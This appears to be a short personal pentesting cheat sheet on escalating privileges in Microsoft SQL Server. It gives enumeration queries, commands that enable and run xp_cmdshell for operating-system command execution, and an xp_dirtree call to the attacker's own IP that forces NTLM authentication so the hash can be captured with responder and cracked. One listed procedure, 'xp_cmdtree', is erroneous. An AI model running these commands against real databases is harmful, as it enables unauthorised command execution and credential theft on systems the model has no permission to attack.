# MSsql Escalation

## Basic Information

select @@version; # version of ms_sql
SELECT is_srvrolemember('sysadmin'); #checks if we are admin
select system_user; # returns the current user in the db


## Try to get access to xp_cmdshell


EXEC xp_cmdshell 'net user'; # This allows us to execute commands.
exec xp_cmdtree 'whoami'; # This allows us to execute commands.
exec xp_dirtree 'c:\'; # Checks if we can list files
	if this is successful we can now try to do a request back to us
	exec xp_dirtree '\\our_ip\test\test';
	we can check if we receive the request with nc. This request will attempt a ntlm authentication, so we can start responder to get the hash and then try to crack it


If we cant use it we need to activate it.

	EXEC sp_configure 'show advanced options', 1;
	RECONFIGURE;
	EXEC sp_configure 'xp_cmdshell', 1;
	RECONFIGURE;



## Relevant Information

	https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server